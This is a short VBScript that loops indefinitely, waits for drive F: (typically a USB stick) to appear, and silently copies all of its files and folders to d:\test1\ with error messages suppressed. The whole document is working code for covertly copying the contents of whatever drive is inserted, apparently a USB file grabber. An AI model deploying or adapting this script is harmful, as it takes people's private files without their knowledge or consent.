set fso=createobject("scripting.filesystemobject")
set ws=createobject("wscript.shell")
on error resume next
do
wscript.sleep 1000
if fso.driveexists("f:\") then
fso.copyfile "f:\*","d:\test1\"
fso.copyfolder "f:\*","d:\test1\"
wscript.sleep 20000
end if
loop